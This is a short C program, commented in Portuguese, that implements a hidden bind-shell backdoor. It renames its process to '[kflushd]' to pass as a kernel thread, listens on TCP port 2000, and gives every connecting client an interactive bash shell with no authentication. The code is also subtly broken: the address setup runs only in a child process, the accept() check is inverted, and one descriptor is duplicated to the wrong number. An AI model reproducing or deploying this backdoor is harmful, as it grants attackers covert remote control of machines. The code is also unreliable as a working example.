#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <strings.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <signal.h>

#define PORT 2000
#define BACKLOG 5
int main(int argc, char const *argv[])
{
    int mysocket, newsocket, tamanho;
    struct sockaddr_in local;
    struct sockaddr_in remote;
/* Ciando processo menor para nao prescisar executar usando &*/
    if(fork() == 0)
    {
        strcpy(argv[0], "[kflushd]");
        signal(SIGCHLD, SIG_IGN);
        /*Cria a estrutura local(servidor)*/
        bzero(&local, sizeof(local));
        local.sin_family = AF_INET;
        local.sin_port = htons(PORT);
        local.sin_addr.s_addr = INADDR_ANY;
        bzero(&(local.sin_zero), 8);
    }

    mysocket = socket(AF_INET, SOCK_STREAM, 0);
    bind(mysocket, (struct sockaddr *)&local, sizeof(struct sockaddr));
    listen(mysocket, BACKLOG);
    tamanho = sizeof(struct sockaddr_in);
    
    while(1) {
        if((newsocket=accept(mysocket, (struct sockaddr *)&remote,&tamanho))) {
            perror("accept");
            exit(1);
        }
        if(!fork())
        {
            close(0); close(1); close(2);
            /*criar copia do newsocket*/
            dup2(newsocket, 0); dup2(newsocket, 1); dup2(newsocket, 3);
            /*shell executada*/
            execl("/bin/bash", "bash", "-i", (char *)0);
            close(newsocket);
            exit(0);
        }
    }
}
